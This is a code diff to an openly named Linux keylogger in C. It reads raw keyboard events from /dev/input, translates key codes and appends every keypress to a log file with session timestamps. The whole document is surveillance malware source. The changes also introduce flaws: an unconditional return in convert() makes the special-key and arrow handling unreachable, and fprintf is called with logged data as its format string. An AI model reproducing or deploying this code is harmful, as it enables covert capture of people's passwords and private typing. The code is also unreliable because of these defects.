@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <unistd.h>
 #include <signal.h>
+#include <time.h>
 #include "keylogger.h"
 
 int running = 1;
@@ -115,27 +116,33 @@ void quitHandler(int sig){
 #if defined(PLATFORM_LINUX)
     #include <linux/input.h>
     #include <sys/ioctl.h>
+
     #define INPUT_DIR "/dev/input/"
+    #define NUM_EVENTS 128
+    #define STANDARD_KEY_COUNT 84
 
     int eventSize = sizeof(struct input_event);
     struct input_event events[NUM_EVENTS];
+    unsigned char string[256];
+    int i;
 
-    const char *keycodes[] = {
+    const char *standardKeyCodes[] = {
             "RESERVED","ESC",
             "1","2","3","4","5","6","7","8","9","0",
             "MINUS","EQUAL","BACKSPACE","TAB",
-            "Q","W","E","R","T","Y","U","I","O","P",
+            "q","w","e","r","t","y","u","i","o","p",
             "LEFTBRACE","RIGHTBRACE","ENTER","LEFTCTRL",
-            "A","S","D","F","G","H","J","K","L",
+            "a","s","d","f","g","h","j","k","l",
             "SEMICOLON","APOSTROPHE","GRAVE","LEFTSHIFT","BACKSLASH",
-            "Z","X","C","V","B","N","M",
-            "COMMA","DOT","SLASH","RIGHTSHIFT","KPASTERISK","LEFTALT","SPACE","CAPSLOCK",
+            "z","x","c","v","b","n","m",
+            "COMMA","DOT","SLASH","RIGHTSHIFT","ASTERISK","LEFTALT","SPACE","CAPSLOCK",
             "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10",
-            "NUMLOCK","SCROLLLOCK"
+            "NUMLOCK","SCROLLLOCK",
+            "7", "8", "9", "MINUS", "4", "5", "6",
+            "PLUS", "1", "2", "3", "0", "DOT"
     };
 
     int bytesRead = 0;
-    int i;
 
     static int is_char_device(const struct dirent *file){
         struct stat filestat;
@@ -207,54 +214,45 @@ void quitHandler(int sig){
 
     }
 
-    /**
-     * Ensures that the string pointed to by str is written to the file with file
-     * descriptor file_desc.
-     *
-     * \returns 1 if writing completes succesfully, else 0
-     */
-    int write_all(int file_desc, const char *str){
-        int bytesWritten = 0;
-        int bytesToWrite = strlen(str) + 1;
+    void convert(int keyCode) {
+        if(keyCode > 0 && keyCode < STANDARD_KEY_COUNT)
+            sprintf(string,"\r\n%s", standardKeyCodes[keyCode]); return;
 
-        do {
-            bytesWritten = write(file_desc, str, bytesToWrite);
-
-            if(bytesWritten == -1){
-                return 0;
-            }
-            bytesToWrite -= bytesWritten;
-            str += bytesWritten;
-        } while(bytesToWrite > 0);
-
-        return 1;
-    }
-
-    /**
-     * Wrapper around write_all which exits safely if the write fails, without
-     * the SIGPIPE terminating the program abruptly.
-     */
-    void safe_write_all(int file_desc, const char *str, int keyboard){
-        struct sigaction new_actn, old_actn;
-        new_actn.sa_handler = SIG_IGN;
-        sigemptyset(&new_actn.sa_mask);
-        new_actn.sa_flags = 0;
-
-        sigaction(SIGPIPE, &new_actn, &old_actn);
-
-        if(!write_all(file_desc, str)){
-            close(file_desc);
-            close(keyboard);
-            perror("\nwriting");
-            exit(1);
+        switch (keyCode) { /* Special characters */
+            case KEY_F11: sprintf(string,"\r\n%s", "F11"); return;
+            case KEY_F12: sprintf(string,"\r\n%s", "F12"); return;
+            case KEY_KPENTER: sprintf(string,"\r\n%s", "ENTER"); return;
+            case KEY_KPSLASH: sprintf(string,"\r\n%s", "SLASH"); return;
+            case KEY_RIGHTALT: sprintf(string,"\r\n%s", "RIGHTALT"); return;
+            case KEY_RIGHTCTRL: sprintf(string,"\r\n%s", "RIGHTCONTROL"); return;
         }
 
-        sigaction(SIGPIPE, &old_actn, NULL);
+        switch (keyCode) { /* Arrows */
+            case KEY_UP: sprintf(string,"\r\n%s", "UP"); return;
+            case KEY_LEFT: sprintf(string,"\r\n%s", "LEFT"); return;
+            case KEY_RIGHT: sprintf(string,"\r\n%s", "RIGHT"); return;
+            case KEY_DOWN: sprintf(string,"\r\n%s", "DOWN"); return;
+        }
+
+        sprintf(string,"\r\nUNRECOGNIZED: %d", keyCode); return;
     }
 
-    void keylogger(int keyboard, int writeout) {
-        signal(SIGINT, quit_handler);
-        signal(SIGTERM, quit_handler);
+    void keylogger(int keyboard, FILE* writeout) {
+        signal(SIGINT, quitHandler);
+        signal(SIGTERM, quitHandler);
+
+        time_t t = time(NULL);
+        struct tm tm = *localtime(&t);
+
+        fprintf(writeout,
+                "\nLOGGING SESSION START: %d-%02d-%02d %02d:%02d:%02d "
+                "\nPLATFORM: LINUX\nCODEC: see linux/input.h",
+                tm.tm_year + 1900,
+                tm.tm_mon + 1,
+                tm.tm_mday,
+                tm.tm_hour,
+                tm.tm_min,
+                tm.tm_sec);
 
         while(running){
             bytesRead = read(keyboard, events, eventSize * NUM_EVENTS);
@@ -262,17 +260,22 @@ void quitHandler(int sig){
             for(i = 0; i < (bytesRead / eventSize); ++i){
                 if(events[i].type == EV_KEY){
                     if(events[i].value == 1){
-                        if(events[i].code > 0 && events[i].code < NUM_KEYS){
-                            safe_write_all(writeout, keycodes[events[i].code], keyboard);
-                            safe_write_all(writeout, "\n", keyboard);
-                        }
-                        else{
-                            write(writeout, "UNRECOGNIZED", sizeof("UNRECOGNIZED"));
-                        }
+                        convert(events[i].code);
+                        fprintf(writeout, string);
                     }
                 }
             }
         }
+
+        t = time(NULL);
+        tm = *localtime(&t);
+        fprintf(writeout, "\nLOGGING SESSION END: %d-%02d-%02d %02d:%02d:%02d",
+                tm.tm_year + 1900,
+                tm.tm_mon + 1,
+                tm.tm_mday,
+                tm.tm_hour,
+                tm.tm_min,
+                tm.tm_sec);
     }
 #endif
 
